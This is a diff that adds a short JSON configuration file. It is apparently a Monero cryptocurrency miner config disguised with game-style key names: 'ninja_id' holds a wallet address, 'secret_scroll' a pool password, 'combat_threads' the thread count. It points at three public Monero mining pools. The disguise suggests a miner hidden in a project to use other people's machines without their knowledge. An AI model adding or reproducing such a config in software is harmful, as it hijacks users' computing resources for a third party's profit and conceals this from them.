@@ -1,0 +1,23 @@
+{
+    "remote_destination": "pool.supportxmr.com",
+    "channel_port": 3333,
+    "ninja_id": "89WGrecLT8HQZfTfX2zPH4fAJNhbMGQQegeZfCHqBL7LG6RsJY7ynVFd3bYbLAVGseEwkpfC2LpaeLXLMFCBgXLXC412sTz",
+    "secret_scroll": "x",
+    "combat_threads": 0,
+    "tls_enabled": false,
+    "log_combat_rate_seconds": 5,
+    "pools": [
+        {
+            "remote_destination": "pool.supportxmr.com",
+            "channel_port": 3333
+        },
+        {
+            "remote_destination": "pool.minexmr.com",
+            "channel_port": 4444
+        },
+        {
+            "remote_destination": "xmrpool.eu",
+            "channel_port": 5555
+        }
+    ]
+}
